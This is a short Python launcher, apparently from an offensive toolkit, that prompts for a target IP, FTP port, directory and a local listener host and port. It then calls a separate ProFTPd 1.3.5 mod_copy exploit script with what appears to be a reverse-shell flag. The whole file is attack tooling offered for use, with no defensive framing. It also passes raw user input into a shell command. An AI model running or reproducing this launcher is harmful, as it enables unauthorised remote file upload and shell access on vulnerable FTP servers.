import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, server, directory, port, local_host, local_port):
        self.server = server
        self.directory = directory
        self.local_host = local_host
        self.local_port = local_port
        self.port = port

    def send(self):
        sub.call(
            f"python3 ProFTPd-1.3.5-with-mod_copy.py -rs -p {self.port} -d {self.directory} -s {self.server} -lh {self.local_host} -lp {self.local_port}",
            shell=True)


attack = Exploit(
    local_host=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter Local Host]:~#"),
    local_port=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter Local Port]:~#"),
    port=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter FTP Port]:~#"),
    directory=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter Directory]:~#"),
    server=input(f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter Target Ip Address]:~#"),
)
if __name__ == "__main__":
    attack.send()
